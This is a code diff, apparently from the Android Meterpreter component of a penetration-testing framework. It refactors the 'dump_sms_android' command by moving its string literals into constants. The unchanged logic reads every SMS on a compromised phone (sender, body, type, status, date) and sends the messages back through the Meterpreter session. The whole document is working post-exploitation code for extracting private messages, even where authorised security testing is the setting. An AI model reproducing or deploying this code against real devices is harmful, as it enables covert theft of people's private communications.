@@ -24,11 +24,18 @@ public class dump_sms_android implements Command {
 	private static final int TLV_TYPE_SMS_DATE = TLVPacket.TLV_META_TYPE_STRING
 			| (TLV_EXTENSIONS + 9006);
 
+	private static final String address = "address";
+	private static final String body = "body";
+	private static final String type = "type";
+	private static final String status = "status";
+	private static final String date = "date";
+	private static final String sms = "content://sms/";
+
 	@Override
 	public int execute(Meterpreter meterpreter, TLVPacket request,
 			TLVPacket response) throws Exception {
 
-		Uri uriSMSURI = Uri.parse("content://sms/");
+		Uri uriSMSURI = Uri.parse(sms);
 		Cursor cur = AndroidMeterpreter.getContext().getContentResolver()
 				.query(uriSMSURI, null, null, null, null);
 
@@ -36,15 +43,12 @@ public class dump_sms_android implements Command {
 			TLVPacket pckt = new TLVPacket();
 
 			pckt.add(TLV_TYPE_SMS_ADDRESS,
-					cur.getString(cur.getColumnIndex("address")));
-			pckt.add(TLV_TYPE_SMS_BODY,
-					cur.getString(cur.getColumnIndex("body")));
-			pckt.add(TLV_TYPE_SMS_TYPE,
-					cur.getString(cur.getColumnIndex("type")));
+					cur.getString(cur.getColumnIndex(address)));
+			pckt.add(TLV_TYPE_SMS_BODY, cur.getString(cur.getColumnIndex(body)));
+			pckt.add(TLV_TYPE_SMS_TYPE, cur.getString(cur.getColumnIndex(type)));
 			pckt.add(TLV_TYPE_SMS_STATUS,
-					cur.getString(cur.getColumnIndex("status")));
-			pckt.add(TLV_TYPE_SMS_DATE,
-					cur.getString(cur.getColumnIndex("date")));
+					cur.getString(cur.getColumnIndex(status)));
+			pckt.add(TLV_TYPE_SMS_DATE, cur.getString(cur.getColumnIndex(date)));
 
 			response.addOverflow(TLV_TYPE_SMS_GROUP, pckt);
 
